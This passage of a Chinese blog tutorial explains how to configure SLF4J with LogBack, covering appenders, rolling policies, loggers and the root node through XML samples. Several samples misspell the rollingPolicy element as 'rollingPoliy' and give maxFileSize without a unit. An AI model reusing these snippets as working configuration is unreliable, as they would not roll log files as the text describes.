class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"STDOUT"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.ConsoleAppender"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">layout</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.classic.PatternLayout"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Pattern</span>&gt;</span>%d&#123;HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">Pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">layout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">"com.chanshuyi"</span> <span class="attr">level</span>=<span class="string">"TRACE"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">"warn"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"STDOUT"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="java日志框架的抉择"><a class="markdownIt-Anchor" href="#java日志框架的抉择"></a> JAVA日志框架的抉择</h1><p>现在最流行的日志框架解决方案莫过于SLF4J + LogBack。其有以下几个优点：</p><ul><li>LogBack自身实现了SLF4J的日志接口，不需要SLF4J去做进一步的适配</li><li>LogBack自身是在Log4J的基础上优化而成的，其运行速度和效率都比LOG4J高</li><li>SLF4J + LogBack支持占位符，方便日志代码的阅读，而Log4j则不支持</li></ul><p>LogBack被分成三个组件：<code>logback-core、logback-classic和logback-access</code></p><ul><li><code>logback-core</code>提供了LogBack的核心功能，是另外两个组件的基础</li><li><code>logback-classic</code>则实现了SLF4J的API，所以当想配合SLF4J使用时，需要将它引入</li><li><code>logback-access</code>是为了集成Servlet环境而准备的，可提供HTTP-access的日志接口</li></ul><p>了解LogBack日志的日志流向，对于我们后面学习日志框架的配置很有帮助。从下图可以看出LogBack的日志记录数据流是从Class或Package流到Logger，再从Logger到Appender，最后从Appender到具体的输出终端</p><p><img src="https://img.mukewang.com/5a2e524700012d5213020826.png" alt="" /></p><h1 id="logback配置文件介绍"><a class="markdownIt-Anchor" href="#logback配置文件介绍"></a> LogBack配置文件介绍</h1><p>LogBack配置文件可以分为几个节点，其中Configuration是根节点，Appender、Logger和Root是Configuration的子节点。</p><h2 id="appender节点"><a class="markdownIt-Anchor" href="#appender节点"></a> Appender节点</h2><p>&lt;appender&gt;是&lt;configuration&gt;的子节点，是负责写日志的组件。appender有两个必要属性name、class。name指定appender的名称，class指定appender的全限定名</p><p>class主要包括：</p><ul><li><code>ch.qos.logback.core.ConsoleAppender</code> 控制台输出</li><li><code>ch.qos.logback.core.FileAppender</code> 文件输出</li><li><code>ch.qos.logback.core.RollingFileAppender</code> 文件滚动输出</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span> <span class="attr">debug</span>=<span class="string">"true"</span> <span class="attr">scan</span>=<span class="string">"true"</span> <span class="attr">scanPeriod</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- conf consoel out --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span> =<span class="string">"console_out"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.ConsoleAppender"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- conf file out --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"file_out"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.FileAppender"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- conf file out --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"file_out"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.RollingFileAppender"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logger</span>&gt;</span><span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="consoleappender"><a class="markdownIt-Anchor" href="#consoleappender"></a> ConsoleAppender</h3><p>把日志添加到控制台，有如下节点：</p><ul><li><code>&lt;encoder&gt;</code>：对日志进行格式化</li><li><code>&lt;target&gt;</code>：字符串System.out 或者 System.err, 默认 System.out</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- conf consoel out --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span> =<span class="string">"console_out"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.ConsoleAppender"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%date [%thread] %-5level %logger - %message%newline<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">"INFO"</span>&gt;</span>             </span><br><span class="line">    <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"console_out"</span> /&gt;</span>   </span><br><span class="line">  <span class="tag">&lt;/<span class="name">root</span>&gt;</span>     </span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="fileappender"><a class="markdownIt-Anchor" href="#fileappender"></a> FileAppender</h3><p>把日志添加到文件，有如下节点：</p><ul><li><code>&lt;file&gt;</code>：被写入的文件名，可以是相对目录，也可以是绝对目录，如果目录不存在则会自动创建</li><li><code>&lt;append&gt;</code>：如果是true，日志被追加到文件末尾，如果是false，清空现存文件，默认是true</li><li><code>&lt;encoder&gt;</code>：对日志进行格式化</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"file_out"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.FileAppender"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">file</span>&gt;</span>logs/debug.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%date [%thread] %-5level %logger - %message%newline<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="rollingfileappender"><a class="markdownIt-Anchor" href="#rollingfileappender"></a> RollingFileAppender</h3><p>滚动记录文件，先将日志记录到指定文件，当符合某种条件时，将日志记录到其他文件，有如下节点：</p><ul><li><code>&lt;file&gt;</code>：被写入的文件名，可以是相对目录，也可以直接目录，如果目录不存在则自动创建</li><li><code>&lt;append&gt;</code>：如果是true，日志被追加到文件末尾，如果是false，清空现存文件，默认是true</li><li><code>&lt;encoder&gt;</code>：对日志进行格式化</li><li><code>&lt;rollingPolicy&gt;</code>：当发生滚动时，决定RollingFileAppender的行为，涉及文件移动和重命名</li></ul><h3 id="rollingpolicy"><a class="markdownIt-Anchor" href="#rollingpolicy"></a> rollingPolicy</h3><ul><li>TimeBaseRollingPolicy：最常用的滚动策略，根据时间来制定滚动策略，即负责滚动也负责除非滚动。有如下节点<ul><li><code>&lt;fileNamePattern&gt;</code>：必要节点，包含文件及&quot;%d&quot;转换符，&quot;%d&quot;可以包含一个<code>java.text.SimpleDateFormat</code>制定的时间格式，如：%d{yyyy-MM}，如果直接使用%d ，默认格式是 yyyy－MM－dd</li><li><code>&lt;maxHistory&gt;</code>：可选节点，控制保留的归档文件的最大数量，超出数量就删除旧文件，假设设置每个月滚动，且&lt;maxHistory&gt;是6，则只保存最近6个月的文件，删除之前的旧文件，注意：删除旧文件是哪些为了归档而创建的目录也会被删除</li><li><code>&lt;filenamePattern&gt;</code>：必须包含&quot;%i&quot;，例如：设置最小值，和最大值分别为1和2，命名模式为<code>log%i.log</code>，会产生归档文件<code>log1.log</code>和<code>log2.log</code>，还可以指定文件压缩选项，例如<code>log%i.log.gz</code>或者<code>log%i.log.zip</code></li></ul></li><li>triggeringPolicy：告知RollingFileAppender，激活RollingFileAppender滚动</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 03:conf errorAppender out --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"errorAppender"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.RollingFileAppender"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">file</span>&gt;</span>logs/error.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 设置滚动策略 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.TimeBasedRollingPolicy"</span>&gt;</span>  </span><br><span class="line">        <span class="comment">&lt;!--设置日志命名模式--&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>errorFile.%d&#123;yyyy-MM-dd&#125;.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--最多保留30天log--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>30<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 超过150MB时，触发滚动策略 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">triggeringPolicy</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.SizeBasedTriggeringPolicy"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maxFileSize</span>&gt;</span>150<span class="tag">&lt;/<span class="name">maxFileSize</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">triggeringPolicy</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d [%p] %-5level %logger - %msg%newline<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="logger节点"><a class="markdownIt-Anchor" href="#logger节点"></a> logger节点</h2><p>logger是&lt;configuration&gt;的子节点，来设置某一个包或者具体的某一个类的日志打印级别，以及指定&lt;appender&gt;。logger仅有一个name属性，两个可选属性level/addtivity</p><ul><li>name：用来指定受此logger约束的某一个包或者具体的某一个类</li><li>level：用来设置打印级别，大小写无关。可选值有TRACE、DEBUG、INFO、WARN、ERROR、ALL和OFF。还有一个特殊值INHERITED或者同义词NULL，代表强制执行上级的级别。如果未设此属性，那么当前logger将会继承上级的级别</li><li>addtivity：是否向上级logger传递打印信息，默认为true</li></ul><p>&lt;logger&gt;可以包含零个或多个&lt;appender-ref&gt;元素，表示这个appender将会添加到logger</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- conf consoel out --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span> =<span class="string">"console_out"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.ConsoleAppender"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.classic.filter.LevelFilter"</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 过滤掉非INFO级别 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">level</span>&gt;</span>INFO<span class="tag">&lt;/<span class="name">level</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">onMatch</span>&gt;</span>ACCEPT<span class="tag">&lt;/<span class="name">onMatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">onMismatch</span>&gt;</span>DENY<span class="tag">&lt;/<span class="name">onMismatch</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--  conf infoAppender out --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"infoAppender"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.RollingFileAppender"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">file</span>&gt;</span>logs/info.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 设置滚动策略 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPoliy</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.TimeBasedRollingPolicy"</span>&gt;</span>  </span><br><span class="line">            <span class="comment">&lt;!--设置日志命名模式--&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>infoFile.%d&#123;yyyy-MM-dd&#125;.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--最多保留30天log--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>30<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPoliy</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 超过150MB时，触发滚动策略 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">triggeringPolicy</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.SizeBasedTriggeringPolicy"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxFileSize</span>&gt;</span>150<span class="tag">&lt;/<span class="name">maxFileSize</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">triggeringPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d [%p] %-5level %logger - %msg%newline<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 添加两个appender节点 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">"logback.olf.log"</span> <span class="attr">level</span>=<span class="string">"info"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span> = <span class="string">"console_out"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span> = <span class="string">"infoAppender"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="root节点"><a class="markdownIt-Anchor" href="#root节点"></a> root节点</h2><p>元素配置根logger。该元素有一个level属性，没有name属性，因为已经被命名为root。Level属性的值大小写无关，其值为下面其中一个字符串：TRACE、DEBUG、INFO、WARN、ERROR、ALL和OFF。如果root元素没有引用任何appender，就会失去所有appender。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- conf consoel out --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span> =<span class="string">"console_out"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.ConsoleAppender"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.classic.filter.LevelFilter"</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 过滤掉非INFO级别 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">level</span>&gt;</span>INFO<span class="tag">&lt;/<span class="name">level</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">onMatch</span>&gt;</span>ACCEPT<span class="tag">&lt;/<span class="name">onMatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">onMismatch</span>&gt;</span>DENY<span class="tag">&lt;/<span class="name">onMismatch</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 01:conf infoAppender out --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"infoAppender"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.RollingFileAppender"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">file</span>&gt;</span>logs/info.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 设置滚动策略 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPoliy</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.TimeBasedRollingPolicy"</span>&gt;</span>  </span><br><span class="line">            <span class="comment">&lt;!--设置日志命名模式--&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>infoFile.%d&#123;yyyy-MM-dd&#125;.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--最多保留30天log--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>30<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPoliy</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 超过150MB时，触发滚动策略 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">triggeringPolicy</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.SizeBasedTriggeringPolicy"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxFileSize</span>&gt;</span>150<span class="tag">&lt;/<span class="name">maxFileSize</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">triggeringPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d [%p] %-5level %logger - %msg%newline<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 02:conf debugAppender out --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"debugAppender"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.RollingFileAppender"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">file</span>&gt;</span>logs/debug.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 设置滚动策略 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPoliy</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.TimeBasedRollingPolicy"</span>&gt;</span>  </span><br><span class="line">            <span class="comment">&lt;!--设置日志命名模式--&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>debugFile.%d&#123;yyyy-MM-dd&#125;.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--最多保留30天log--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>30<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPoliy</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 超过150MB时，触发滚动策略 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">triggeringPolicy</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.SizeBasedTriggeringPolicy"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxFileSize</span>&gt;</span>150<span class="tag">&lt;/<span class="name">maxFileSize</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">triggeringPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d [%p] %-5level %logger - %msg%newline<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 03:conf errorAppender out --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"errorAppender"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.RollingFileAppender"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">file</span>&gt;</span>logs/error.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 设置滚动策略 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPoliy</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.TimeBasedRollingPolicy"</span>&gt;</span>  </span><br><span class="line">            <span class="comment">&lt;!--设置日志命名模式--&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>errorFile.%d&#123;yyyy-MM-dd&#125;.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--最多保留30天log--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>30<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPoliy</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 超过150MB时，触发滚动策略 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">triggeringPolicy</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.SizeBasedTriggeringPolicy"</span>&gt;</span></span><br><span class="line">            